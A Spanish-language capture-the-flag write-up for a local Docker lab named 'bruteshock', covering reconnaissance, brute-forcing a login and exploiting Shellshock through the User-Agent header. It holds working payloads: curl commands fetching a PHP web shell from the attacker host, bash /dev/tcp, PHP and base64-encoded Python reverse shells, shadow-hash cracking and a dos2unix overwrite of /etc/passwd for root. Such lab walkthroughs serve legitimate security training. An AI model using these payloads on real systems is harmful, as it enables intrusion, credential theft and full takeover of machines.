>[!NOTE] Habilidades: 
> Brute Force Attack (Login Page),  ShellShock Remote Code Execution, User Shadow Hash Cracking using John, Bash `-eq` Comparison Privilege Escalation, Exim using Privilege escalation (Sudo), Dos2unix Privilege Escalation abusing Write Permissions (Sudo) 

## Lanzar el laboratorio

Para desplegar el laboratorio de `docker` que estaremos explotando, ejecutaremos los siguientes comandos

~~~ bash
# Descomprimimos el archivo
unzip bruteshock.tar

# Asignamos permisos de ejecución al script que despliega el laboratorio
chmod +x auto_deploy.sh

# Lanzamos el laboratorio
./auto_deploy.sh bruteshock.tar
~~~

![Pasted image 20241105091157](https://github.com/user-attachments/assets/bf1c2311-bebb-4f73-9b37-92010e440da5)

Se nos muestra la dirección IP de la máquina víctima que en este caso es `10.88.0.3`, si tu máquina usa `docker` deberías ver la dirección `172.17.0.2`

Docker generalmente asigna la dirección de red `172.17.0.0` como dirección de red, pero en este caso estamos usando `podman`, es por eso la diferencia

![Pasted image 20241105091651](https://github.com/user-attachments/assets/17c3ef03-9b75-441b-b435-e4708baf6123)

En mi caso trabajaré con el dominio `bruteshock.local`, que lo agregué a mi archivo `/etc/hosts` para mayor comodidad

## Ping

~~~ bash
ping -c1 bruteshock.local
~~~

![Pasted image 20241105091717](https://github.com/user-attachments/assets/4b82a587-29af-404b-a120-9a089852ae5d)


# Reconocimiento
---
## Nmap 

Haremos un primer escaneo por el protocolo TCP, con el fin de descubrir puertos abiertos, si no encontráramos información relevante, haríamos escaneos por otros protocolos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -v bruteshock.local -oG openPorts
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

![Pasted image 20241105091926](https://github.com/user-attachments/assets/4f505a02-53fb-49a1-bbe7-8e32c0e75f0d)

Ahora haremos un escaneo de servicios para detectar la versión y el tipo de servicio que se ejecuta en los puertos que hemos encontrado

~~~ bash
nmap -sVC -p 80 bruteshock.local -oN services
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento para identificar posibles vulnerabilidades conocidas
- `-oN`: Exportar en formato `nmap` (se vea igual que el output de nmap)

![Pasted image 20241105092420](https://github.com/user-attachments/assets/23cd8353-b5d2-488c-82c6-6b853d9643b5)

## Whatweb

~~~ bash
whatweb http://bruteshock.local
~~~

Usaremos la herramienta `whatweb` para detectar las tecnologías que se están ejecutando en el servidor web

![Pasted image 20241105092705](https://github.com/user-attachments/assets/3a660c32-7d92-48ea-869f-c11975c7dee7)

Nos reporta un error `403`, esto quiere decir que no estamos autorizados a ver el contenido. Si visitamos la web a primera vista no vemos gran cosa, hasta que recargamos y nos muestra una web supuestamente privada

![Pasted image 20241105092844](https://github.com/user-attachments/assets/d9e7a340-e2e9-45c2-b7bc-301eb2fe9fc6)

![Pasted image 20241105093652](https://github.com/user-attachments/assets/95ded6cd-0a2d-43ae-ab25-073af7ee93c8)

Esto ocurre porque se cuando iniciamos por primera vez no nos carga la `cookie` de PHP (`PHPSESSID`) 

![Pasted image 20241105093949](https://github.com/user-attachments/assets/c56a8b70-664c-484b-adc5-445f740d6aea)

Entonces si usamos la cookie que nos proporcionó en el navegador, ahora tendremos acceso al contenido

![Pasted image 20241105093523](https://github.com/user-attachments/assets/b654fd77-0c0c-4af4-bdf0-529864a1f2f2)

## Fuzzing

Primeramente haremos `fuzzing` para descubrir directorios o archivos interesantes, lo haremos con la herramienta `wfuzz`

~~~ bash
wfuzz -c --hc=404 -H "Cookie: PHPSESSID=p94n4hgjjvq1ti9f7relhhdh06" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://bruteshock.local/FUZZ
~~~

- `-c`: Formato colorizado
- `--hc=404`: Ocultamos las respuestas con el código de estado `404`
- `-H`: Definir una cabecera `HTTP`, en este caso es necesario enviar el valor de la `cookie` de sesión 
- `-w`: Diccionario de palabras a usar
- `-t 200`: Definimos 200 subprocesos para agilizar el proceso de `fuzzing`

![Pasted image 20241106000133](https://github.com/user-attachments/assets/2666620d-4c77-4253-af78-efc7972d1688)

Pero no obtendremos resultados interesantes, en este punto podemos intentar hacer un ataque de fuerza bruta para intentar descubrir alguna contraseña en el `login`

# Explotación
---
## Brute Force

Intentaremos encontrar la contraseña de un usuario `admin` a través de un ataque de fuerza bruta al panel de autenticación usando `wfuzz`

~~~ bash
wfuzz -c --hl 69 -H "Cookie: PHPSESSID=p94n4hgjjvq1ti9f7relhhdh06" -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -t 200 http://bruteshock.local/
~~~

- `--hl 69`: Ocultamos las respuestas con `69` líneas
- `-H`: Especificamos una cabecera HTTP
- `-d`: Definimos el contenido de los datos que enviaremos

En este caso, cada respuesta fallida posee un total de `69` líneas y un código de estado exitoso (`200`), es por eso que en vez de filtrar por código de estado, filtramos por la cantidad de líneas

![Pasted image 20241105103223](https://github.com/user-attachments/assets/d8f0a80c-8dcc-49bc-8268-273f71d49bbd)

En este caso hemos encontrado una contraseña `christelle` supuestamente válida para el usuario `admin`. Si iniciamos sesión, nos salta este recuadro con un mensaje del éxito

![Pasted image 20241105103330](https://github.com/user-attachments/assets/fc1112ef-4f6f-429d-bda2-0b55d10d6435)

Nos redirige a este nuevo panel con la URL `http://bruteshock.local/pruebasUltraSecretas`

![Pasted image 20241105103408](https://github.com/user-attachments/assets/00d19083-57b7-44ba-80d7-728f6f7cdad8)

Podemos ver que nos reporta un mensaje que dice: `User-Agent almacenado en el log`, lo que nos puede ayudar en nuestra explotación

## ShellShock

Pensé que esta explotación sería algo sobre envenenamiento hasta que me acordé del nombre de la máquina, se trataría de `Shellshock`. Este es un ataque que se lleva a cabo a través de la cabecera `User-Agent` , un bug de `bash` que permite la ejecución remota de comandos, una detección para esta máquina sería la siguiente

![Pasted image 20241105222724](https://github.com/user-attachments/assets/3c1c3b65-b334-47b2-b05b-6c6eb02cf789)

## Proof of Concept

Ejecutamos esta solicitud `http` para la URL `http://bruteshock.local/pruebasUltraSecretas`

~~~ bash
curl -I -sLX GET http://bruteshock.local/pruebasUltraSecretas/ -A "() { :; }; curl http://10.88.0.1/test"
~~~

https://github.com/user-attachments/assets/2cc244a8-a28d-4c8c-b138-00561a43e3a9

Aprovecha el bug Willy!. En el ejemplo anterior estaríamos intentando enviarnos una solicitud HTTP a nuestro servidor `python3`. Es cuando el payload se ejecuta correctamente y envía un `request` a nuestro servidor solicitando un archivo `test`

## File Upload

Aprovechando este bug podremos enviar una `reverse shell` a nuestra máquina atacante, para ello crearemos un archivo que usaremos para ejecutar comandos, nos ayudaremos de `Brupsuite` o `curl`

Archivo `rce.php`
 
~~~ bash
echo '<?php system($_GET["cmd"]); ?>' > rce.php
~~~

Modificaremos el `User-Agent` y enviaremos la siguiente solicitud, pero primero tendremos un servidor HTTP con `python3`

![Pasted image 20241105231701](https://github.com/user-attachments/assets/c1aab102-6eb0-46dc-92be-8346cb200b65)

### Burpsuite

En `Burpsite` interceptaremos el tráfico y enviaremos la siguiente solicitud

~~~ bash
() { :; }; curl http://10.88.0.1/rce.php -o exec.php
~~~

![Pasted image 20241105231020](https://github.com/user-attachments/assets/2c5b993c-2c5c-40cd-9c73-c4cdeaa41511)

### Curl

~~~ bash
curl -I -sLX GET http://bruteshock.local/pruebasUltraSecretas/ -A "() { :; }; curl http://10.88.0.1/rce.php -o exec.php"
~~~

En nuestro servidor que iniciamos con `python` deberíamos ver un `GET` a nuestro archivo `rce.php`

![Pasted image 20241105231215](https://github.com/user-attachments/assets/0ce98988-aeb2-4bc9-ba34-f51b92387bf6)

## Remote Code Execution

Ahora mediante la web accedemos al archivo `rce.php`, podemos hacerlo o bien desde la web o mediante `curl`

~~~ bash
curl -X GET http://bruteshock.local/pruebasUltraSecretas/exec.php\?cmd=id
~~~

![Pasted image 20241105231441](https://github.com/user-attachments/assets/6cf21703-7e9b-4d0d-8ae5-7e651e6419c5)

![Pasted image 20241105131749](https://github.com/user-attachments/assets/7b23ebb3-50b9-4d67-aac4-832572090867)

## Reverse Shell

Podemos intentar enviarnos una `shell` mediante este parámetro, para ello modificaremos el siguiente payload

~~~ bash
bash -c "bash -i >&/dev/tcp/10.88.0.1/443 0>&1"
~~~

![Pasted image 20241105232028](https://github.com/user-attachments/assets/8ce22f4c-4c2a-4e06-a410-dcc4c3df6616)

Nota que cambié el caracter `&` por `%26` para que pueda ejecutarse correctamente en el servidor

![Pasted image 20241105231953](https://github.com/user-attachments/assets/81bad5bc-b764-4a8b-8cf1-d3d79f502670)

Si entramos de esta forma al poco tiempo de establecer la `shell`, nos concluye la conexión, esto puede ser porque el servidor está bloqueando ciertos tipos de conexiones

Usaremos una `reverse shell` con `php` para no depender de un TTY, el comando sería el siguiente

~~~ bash
php -r '$sock=fsockopen("10.88.0.1",4444);exec("/bin/bash -i <&2 >&3 2>&4");'
~~~

Pero tampoco podremos ejecutarlo directamente, es por eso que una opción sería usar `base64` para primero decodificar la `shell` y luego interpretarla en el servidor

~~~ bash
echo "cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc=" | base64 -d | bash
~~~

**Hagamos unas pruebas antes de establecer la `shell`, primero necesitamos entender que debemos modificar la URL para que nuestra explotación pueda acontecerse**

- Nota que en medio de la cadena en `base64` que hay un caracter (`+`) que limita nuestra  ejecución, es por eso que **debemos reemplazarlo** con `%2B`, que es su traducción en `Url Encoding`

**Ejecutaremos el comando sin aplicar `| bash` para ver el contenido de la cadena que se decodifica**

`Antes`

~~~ bash
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA+JjMgMj4mMyIpOyc=
~~~

![Pasted image 20241105234140](https://github.com/user-attachments/assets/4833040d-baf7-46ba-b838-a2d998d6974e)


`Después`

~~~ bash
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA%2BJjMgMj4mMyIpOyc=
~~~

![Pasted image 20241105234108](https://github.com/user-attachments/assets/d27210d5-1302-43ae-8971-9e7a5e79a69e)

Ahora con este pequeño cambio deberíamos poder establecer una `shell` sin problemas

~~~ bash
http://bruteshock.local/pruebasUltraSecretas/exec.php?cmd=echo%20%22cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjg4LjAuMSIsNDQ0NCk7ZXhlYygiL2Jpbi9iYXNoIDwmMyA%2BJjMgMj4mMyIpOyc=%22%20|%20base64%20-d%20|%20bash
~~~

![Pasted image 20241105234657](https://github.com/user-attachments/assets/7613cabc-83a4-4f7a-a84d-1770fdfb053f)


# Escalada de privilegios
---
## Tratamiento TTY

Haremos el típico tratamiento de la TTY para operar de una forma más cómoda y poder hacer `Ctrl + C` y `Ctrl + L`

~~~ bash
export TERM=xterm
export SHELL=/bin/bash
script /dev/null -c bash
^Z

stty raw -echo;fg
reset xterm
~~~

![Pasted image 20241105233905](https://github.com/user-attachments/assets/d8cb47f9-d305-4e45-9d86-859be04fe46a)

Finalmente ajustamos las proporciones al tamaño de la terminal para poder tener una visualización más cómoda

~~~ bash
stty rows 44 columns 189
~~~

## Sudo

Listaremos los privilegios que tengamos asignados con `sudo` para ver si tenemos capacidad para ejecutar un archivo

![Pasted image 20241105174242](https://github.com/user-attachments/assets/936b22d2-624e-46ec-af07-b546e6f45d6b)


Nos pide la contraseña del usuario `www-data`, pero como no la tenemos, seguiremos buscando otra forma de escalar

## SUID Binaries

Listaremos aquellos binarios los cuales tengan asignado el permiso `suid` asignado

![Pasted image 20241105174333](https://github.com/user-attachments/assets/b95d4b41-c14d-41a7-8e67-4f772dfcded7)

Vemos que existe `exim4`, pero esta versión no sería vulnerable a algún `CVE` reportado. Iremos a la carpeta `/home` para ver si podemos ver el contenido de algún usuario

![Pasted image 20241105174555](https://github.com/user-attachments/assets/d7f6a170-a8d2-4805-af4c-9bc647b25c79)

Existe un script de `bash` llamado `script.sh` en la carpeta del usuario `maci`, y al parecer podemos ejecutarlo

## Bash `-eq`

Existe una forma de escalar privilegios mediante el uso de la comparación `-eq` de `bash`, donde el uso de doble corchetes permite inyectar un comando (`[[ $num -eq 123123 ]]`)

![Pasted image 20241105174829](https://github.com/user-attachments/assets/4bad1f82-d4ab-4745-bdef-3dc9812a30ac)

Para aprovechar esto y escalar privilegios, usaremos el siguiente comando

~~~ bash
sudo -u maci ./script.sh
~~~

- `-u`: Ejecutamos el comando como el usuario `maci`

Cuando nos pida adivinar pegaremos lo siguiente

- `a[$(/bin/bash >&2)]+42`

![Pasted image 20241105210916](https://github.com/user-attachments/assets/9fba3ef0-36e0-4235-841f-b505ad5213ee)

No nos es posible escalar nuestros privilegios usando este método, así que buscaremos otras formas para migrar a otro usuario

## File Discovery

Buscaremos archivos en el sistema cuyo miembro sea cada usuario en cuestión

~~~ bash
find / -user "darksblack" -readable 2>/dev/null
~~~

- `-user`: Usuario propietario
- `-readable`: Capacidad de lectura

![Pasted image 20241105175226](https://github.com/user-attachments/assets/14135d25-c43a-4e50-afe0-ff37b5451ae8)

Si inspeccionamos el archivo vemos lo siguiente

~~~ bash
cat /var/backups/darksblack/.darksblack.txt
~~~

![Pasted image 20241105175834](https://github.com/user-attachments/assets/294b30b6-9565-4c6f-9918-19c6ce7cf1ad)

## John (cracking shadow hash)

Parece ser el `hash` del archivo `/etc/shadow` para el usuario `darksblack`, intentaremos crackear este hash usando la herramienta `john`

~~~ bash
john --format=crypt--wordlist=/usr/share/wordlist/rockyou.txt hash.txt
~~~

- `--format=crypt`: Detectar el algoritmo usado de forma automática para Unix
- `--wordlist`: Especificamos el diccionario a usar para crackear el hash

![Pasted image 20241105180828](https://github.com/user-attachments/assets/2e61d663-6a3c-4661-808c-e8ed32b0ba3c)

## Darksblack

Hemos encontrado la contraseña `salvador1` para el usuario `darksblack`, por lo que ya podemos migrar a este usuario

~~~ bash
su darksblack
~~~

![Pasted image 20241105182658](https://github.com/user-attachments/assets/947cfad7-0419-4f8a-a242-e8aa82227260)

## Sudo `script.sh`

Inicialmente comprobaremos los privilegios `sudo` para este nuevo usuario

~~~ bash
sudo -l
~~~

![Pasted image 20241105182620](https://github.com/user-attachments/assets/34f75c2f-dea0-44e7-93e9-d2d00027caa2)

Podemos ejecutar el `script.sh` que descubrimos anteriormente, por lo que ahora intentamos elevar nuestro privilegio usando `sudo`

~~~ bash
sudo -u maci ./script.sh
~~~

`Payload`

~~~ bash
a[$(/bin/sh >&2)]+42
~~~

![Pasted image 20241105183521](https://github.com/user-attachments/assets/e802bac2-aa92-4654-93a7-d0fb52a404db)

Para volver a una `bash`, simplemente escribimos `bash`

## Sudo `exim`

Listaremos los privilegios `sudo` que tenemos asignados para el usuario actual

~~~ bash
sudo -l
~~~

![Pasted image 20241105183719](https://github.com/user-attachments/assets/66269833-9c6c-4476-b00e-8e4528951093)


Podemos ejecutar `exim` como el usuario `pepe`, por lo que podemos intentar ejecutar `bash` como este usuario, para ejecutar algún comando a través de `exim`, podemos hacerlo mediante el siguiente comando

~~~ bash
exim -be '${run{/usr/bin/id}}'
~~~

![Pasted image 20241105184456](https://github.com/user-attachments/assets/706776d2-e378-4091-bcbd-b31f5780d683)

Intentamos migrar al usuario `pepe` con `sudo`

~~~ bash
echo '#!/bin/bash' > /tmp/privesc && echo "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtpbXBvcnQgc29ja2V0LG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjg4LjAuMSIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL2Jhc2giKSc=' | base64 -d | bash" >> /tmp/privesc
~~~ 

![Pasted image 20241105203456](https://github.com/user-attachments/assets/734ffa2c-7fed-4221-8099-21b70bea9ded)

Antes de lanzar la `shell` le damos permisos de ejecución al `script`

~~~ bash
chmod +x /tmp/privesc
~~~

## Shell

Nos ponemos en escucha con `nc` por el puerto `443` para recibir la `shell`

~~~ bash
nc -lvnp 443
~~~

## Pepe

Ejecutamos la reverse shell de la siguiente forma

~~~ bash
sudo -u pepe exim -be '${run{/bin/bash -c "/tmp/privesc"}}'
~~~

![Pasted image 20241105203354](https://github.com/user-attachments/assets/8e2ba934-3fa0-455b-89c2-d1fd0100d86c)

Y estaríamos conectados como el usuario `pepe`, ahora finalmente nos queda escalar a `root`

![Pasted image 20241105203659](https://github.com/user-attachments/assets/a389cc80-b23c-4e9c-b04a-46d5d931c34d)

## Tratamiento TTY

Hacemos un tratamiento de la TTY para poder hacer `Ctrl + C` y `Ctrl + L`

~~~ bash
export TERM=xterm

script /dev/null -c bash
^Z

stty raw -echo;fg
reset xterm
/bin/bash
stty columns 189 rows 44
~~~

![Pasted image 20241105204545](https://github.com/user-attachments/assets/e1ab3f89-22c2-410c-bda2-4b45b9222073)

## Sudo `dos2unix`

Listaremos nuestros privilegios `sudo` para ver si tenemos acceso a un recurso nuevo el cual podamos explotar para elevar nuestros privilegios

~~~ bash
sudo -l
~~~

![Pasted image 20241105205458](https://github.com/user-attachments/assets/f376c794-891c-4511-b6ff-8431fd1fca5f)

Tenemos capacidad de ejecutar `dos2unix` sin proporcionar contraseña. Con la capacidad de escritura de archivos con `dos2unix`, podemos llevar a cabo una escalada de privilegios mediante una escritura privilegiada

![Pasted image 20241105204818](https://github.com/user-attachments/assets/a6c98f00-ff05-4b92-be82-b0837415b4a8)

Usaremos el contenido de `/etc/passwd` para nuestra escalada, primeramente hacemos una copia del `/etc/passwd` en algún directorio como `/tmp`

~~~ bash
cat /etc/passwd > /tmp/passwd
~~~

**Ahora necesitamos que la línea del archivo donde se encuentra `root` esté sin la letra `x`, al eliminar la "x" en el campo de contraseña de `root`, indicaríamos al sistema que `root` no tiene contraseña almacenada en `/etc/shadow`. Esto dejaría la cuenta `root` accesible sin contraseña**

![Pasted image 20241105210916](https://github.com/user-attachments/assets/1d27b164-dc4a-46e6-92fc-0c4d1f472b23)

Entonces modificamos el archivo que acabamos de crear

~~~ bash
nano /tmp/passwd
~~~

![Pasted image 20241105211157](https://github.com/user-attachments/assets/add6ec30-8773-4b17-b01f-aeb210dffcd9)

## Root time

Ahora preparamos el entorno para usar ambos archivos en nuestra escalada de privilegios

~~~ bash
passwd_new=/tmp/passwd
passwd_old=/etc/passwd
~~~

![Pasted image 20241105211934](https://github.com/user-attachments/assets/c57d012f-d38e-4faf-9599-582a59cf7058)


Ejecutamos `dos2unix` con `sudo` y usando ambos archivos

~~~ bash
sudo /usr/bin/dos2unix -f -n "$passwd_new" "$passwd_old"
~~~

![Pasted image 20241105211802](https://github.com/user-attachments/assets/7740535d-4cb9-4ebe-8a36-43eb738d5c20)


Finalmente cambiamos al usuario `root` con el comando `su`

~~~ bash
su root
~~~

![Pasted image 20241105211822](https://github.com/user-attachments/assets/261ba158-2d3f-4152-9fa4-9ae0e8abf898)



